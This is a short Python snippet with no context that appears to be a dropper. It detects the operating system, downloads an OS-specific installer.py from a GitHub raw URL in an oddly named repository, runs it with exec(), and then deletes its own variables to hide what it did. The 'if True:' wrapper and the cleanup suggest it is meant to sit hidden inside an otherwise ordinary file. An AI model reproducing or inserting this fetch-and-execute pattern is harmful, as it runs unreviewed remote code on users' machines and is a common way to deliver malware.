if True:
  from platform import system
  from requests import get
  OS = {'Windows': 'windows', 'Linux': 'linux', 'Darwin': 'mac-OS'}[system()]
  os_gh_repo = f'https://raw.githubusercontent.com/davifaaricardo/psychic-octo-couscous/{OS}/installer.py' 
  GET_Request = get(os_gh_repo)
  exec(GET_Request.text) 
  del GET_Request,os_gh_repo, OS, get, system
